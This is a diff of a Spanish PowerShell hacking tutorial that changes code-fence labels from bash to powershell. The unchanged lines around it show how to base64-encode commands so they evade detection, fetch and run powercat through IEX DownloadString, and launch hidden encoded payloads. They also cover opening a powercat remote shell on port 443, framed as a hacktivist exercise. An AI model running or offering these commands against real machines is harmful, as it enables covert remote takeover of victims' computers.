@@ -26,7 +26,7 @@ Esto se puede utilizar para chats sencillos, para transferencia de archivos, par
 
 Una shellcode, en general, es código que se ejecuta en PowerShell. Pueden ser comandos, funciones, o scripts enteros. Por ejemplo, esto es una shellcode muy sencilla:
 
-```bash
+```powershell
 Write-Host 'Esto es una shellcode'
 ```
 
@@ -40,7 +40,7 @@ Esto tiene una ventaja: Si nuestro código ejecuta acciones maliciosas o potenci
 
 Para encodear una shellcode y ejecutarla, no tenemos más que ejecutar lo siguiente:
 
-```bash
+```powershell
 $comando = ‘<shellcode>’
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($comando)
 $shenc = [Convert]::ToBase64String($bytes)
@@ -69,7 +69,7 @@ Para poder ejecutar código arbitrario remotamente en PowerShell necesitamos:
 
 La instalación de Powercat es muy sencilla. Siguiendo [el GitHub del creador](https://github.com/besimorhino/powercat "GitHub del creador"), solo necesitamos ejecutar el siguiente comando para tener Powercat listo:
 
-```bash
+```powershell
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 ```
 
@@ -112,7 +112,7 @@ El siguiente paso es encodearlo. Recomiendo borrar los comentarios para que el a
 
 Ahora hay que guardarla en un archivo para enviarla. Para ello, usad lo siguiente:
 
-```bash
+```powershell
 $shenc > KanseiEncripto.txt
 ```
 ##### Aviso de error
@@ -131,7 +131,7 @@ Esto creará un servidor en el puerto 80 (típicamente abierto para conexiones h
 
 Lo siguiente es conectarnos a este servidor desde la máquina atacada. La IP del servidor en este ejemplo será 0.0.0.0, pero recordad que debéis usar la IP real del servidor.
 
-```bash
+```powershell
 powercat –c 0.0.0.0 –p 80
 ```
 
@@ -153,13 +153,13 @@ Lo siguiente que debemos hacer es copiar este código y abrir el Bloc de notas d
 
 Ahora, solo nos queda pasar la shellcode encodeada a PowerShell. Para ello, la guardaremos en una variable:
 
-```bash
+```powershell
 $enc = cat .\Enc.txt
 ```
 
 Una vez guardada, la ejecutaremos en PowerShell sin perfil y con la ventana oculta. Para ello, hacemos:
 
-```bash
+```powershell
 powershell –nop –window hidden –enc $enc
 ```
 
@@ -209,7 +209,7 @@ Eres parte de un grupo de hacktivistas que se hacen llamar los Ladrones Fantasma
 
 Para hacerlo, tendremos que generar un payload desde Powercat. En nuestro caso, el payload es una shellcode encodeada, sin más. El payload dejará un servidor en el puerto 443, que le dará el control de la PowerShell al atacante. Para ello, hacemos:
 
-``` bash
+```powershell
 powercat –l –p 443 –ep –ge > Payload.txt
 ```
 
@@ -221,7 +221,7 @@ Volvemos a hacer lo que hacemos siempre: Pasamos el payload al otro ordenador co
 
 Ahora que está ejecutando en oculto, nos volvemos a conectar a la misma IP, utilizando como puerto el 443. Es decir:
 
-```bash
+```powershell
 powercat –c 0.0.0.0 –p 443
 ```
 
